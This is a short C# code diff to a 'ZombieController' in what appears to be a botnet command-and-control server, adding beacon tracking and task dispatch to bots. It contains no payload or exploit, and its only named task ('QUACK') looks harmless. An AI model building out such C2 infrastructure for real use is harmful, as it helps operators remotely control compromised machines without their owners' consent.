@@ -57,26 +57,27 @@ public class ZombieController : AbstractController
 
     [HttpGet("Beacon")]
     [ProducesResponseType(typeof(ActionEnum), StatusCodes.Status200OK)]
-    public async Task<IActionResult> Beacon([FromQuery] int bot_id, [FromQuery] int task_id)
+    public async Task<IActionResult> Beacon([FromQuery] int bot_id, [FromQuery] int task_id, [FromQuery] ProgressEnum progress)
     {
-        C2State.BotManager.Bots[bot_id].ConnectionInfo.LastHeardFrom = DateTime.UtcNow;
+        var bot = C2State.BotManager.Bots[bot_id];
+        bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;
 
         return Ok(ActionEnum.CONTINUE);
     }
 
     [HttpGet("Request")]
     [ProducesResponseType(typeof(BotTask), StatusCodes.Status200OK)]
+    [ProducesResponseType(StatusCodes.Status204NoContent)]
     public async Task<IActionResult> Request([FromQuery] int bot_id)
     {
-        return Ok(new BotTask()
+        BotTask? task = C2State.TaskManager.DispatchTask();
+
+        if (task != null)
         {
-            Id = 5,
-            Task = TaskEnum.QUACK,
-            TaskParameters = new Dictionary<string, object>()
-            {
-                {"frequency", 5},
-                {"count", 100}
-            }
-        });
+            C2State.BotManager.Bots[bot_id].TaskId = task.Id;
+            return Ok(task);
+        }
+
+        return NoContent();
     }
 }
